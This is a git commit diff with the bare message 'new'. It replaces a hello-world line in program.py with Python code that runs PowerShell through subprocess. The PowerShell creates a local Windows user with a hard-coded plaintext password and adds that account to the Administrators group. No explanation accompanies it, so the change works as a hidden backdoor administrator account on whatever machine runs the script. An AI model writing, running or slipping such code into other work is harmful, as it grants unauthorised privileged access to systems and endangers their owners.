443edb8755f6cb641a7c796c4b8eb746edfa06f1
Tinotin1 <jackmoesch@gmail.com>
2022-12-07 10:53:04 -0600

    new

--- program.py
+++ program.py
@@ -1,1 +1,11 @@
-print("Hello world!")
+command = """
+$nusnm = """ + '"{}"'.format("the") + """
+$nuspss = ConvertTo-SecureString """ + '"{}"'.format("webiwabo") + """ -AsPlainText -Force
+New-LocalUser -Name $nusnm -Password $nuspss
+Add-LocalGroupMember -Group "Administrators" -Member $nusnm
+Get-LocalUser
+"""
+
+print(command)
+import subprocess
+exec = subprocess.Popen(["powershell","& { +" + command + "}"])
